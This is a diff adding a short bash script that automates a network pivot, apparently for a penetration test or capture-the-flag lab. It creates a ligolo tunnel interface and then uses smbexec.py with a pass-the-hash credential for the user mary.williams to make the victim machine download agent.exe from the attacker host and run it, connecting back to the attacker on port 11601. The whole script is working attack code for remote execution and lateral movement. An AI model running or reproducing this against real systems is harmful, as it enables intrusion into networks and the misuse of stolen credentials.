@@ -1,0 +1,18 @@
+#!/bin/bash
+
+attacker="192.168.192.100"
+vicitm="10.10.10.10"
+subnet="10.10.10.0/24"
+
+
+printf "[+] Setting up ligolo..."
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add $subnet dev ligolo
+
+printf "\n[+] Start the ligolo proxy server..."
+sleep 8
+
+printf "\n[+] Starting pivot...."
+smbexec.py -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@$vicitm -shell-type powershell "iwr http://$attacker/agent.exe -usebasicparsing -outfile C:\users\Administrator\Documents\agent.exe;start-process -nonewwindow C:\Users\Administrator\Documents\agent.exe -Argumentlist ('-connect $attacker:11601 -ignore-cert')"
+printf "\n[+] Done\n"
